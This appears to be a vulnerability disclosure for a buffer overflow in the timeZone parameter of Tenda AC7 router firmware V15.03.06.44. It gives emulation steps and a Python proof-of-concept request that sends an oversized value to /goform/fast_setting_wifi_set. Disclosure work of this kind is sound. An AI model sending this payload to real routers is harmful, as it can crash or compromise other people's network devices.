form_fast_setting_wifi_set timeZone
---------------------------------------
Overview
--------

Experimental environment：ub20

Firmware download website：[AC7 V1.0 升级软件](https://www.tenda.com.cn/material/show/102776)
![image](https://github.com/user-attachments/assets/6c8f66b9-f107-4610-973f-d5f4365cfbd8)

### Environmental simulation

need build Network bridge:

```text-plain
apt install uml-utilities bridge-utils
brctl addbr br0
ifconfig br0 192.168.0.1/24
brctl addif br0 ens33//搭建网桥
```

Directly using the httpd in the original firmware will cause the simulation to fail due to the environment check. Here is the patched httpd file (a7\_\_V15.03.06.44\_httpd\_ok file in this project) (modify the assembly to force skip the environment check step): [https://github.com/Raining-101/IOT\_cve/blob/main/a7\_\_V15.03.06.44\_httpd\_ok](https://github.com/Raining-101/IOT_cve/blob/main/a7__V15.03.06.44_httpd_ok)

qemu command：

```text-plain
sudo qemu-mipsel-static -L . ./bin/httpd
```

Attacked version
----------------

V15.03.06.44

### Vulnerability Details

This vulnerability lies in the `/goform/fast_setting_wifi_set` page

Tengda AC7 V1.0 V15.03.06.44 found a buffer overflow caused by the timeZone parameter in the form\_fast\_setting\_wifi\_set function, which can cause RCE:

![image](https://github.com/user-attachments/assets/387bfe10-e1c0-4312-a179-156bed2898bb)


### poc

```text-plain
import requests

url = "http://192.168.142.100/goform/fast_setting_wifi_set"
headers = {
    "Host": "192.168.142.100",
    "Content-Length": "1391",
    "Accept": "*/*",
    "X-Requested-With": "XMLHttpRequest",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "Origin": "http://192.168.142.100",
    "Referer": "http://192.168.142.100/parental_control.html?random=0.7058891673130268&",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Connection": "close",
    "Cookie": "password=iqb1qw; bLanguage=cn"
}


long_part = "Raining101" * 0x100
timeZone_value = f"{long_part}:{long_part}"  

data = {
    "ssid": "1",
    "timeZone": timeZone_value
}

response = requests.post(url, headers=headers, data=data)
print(f"Status Code: {response.status_code}")
print(f"Response Text: {response.text}")
```

![image](https://github.com/user-attachments/assets/e4e175e3-4637-4e34-a4d2-e785e424af4c)

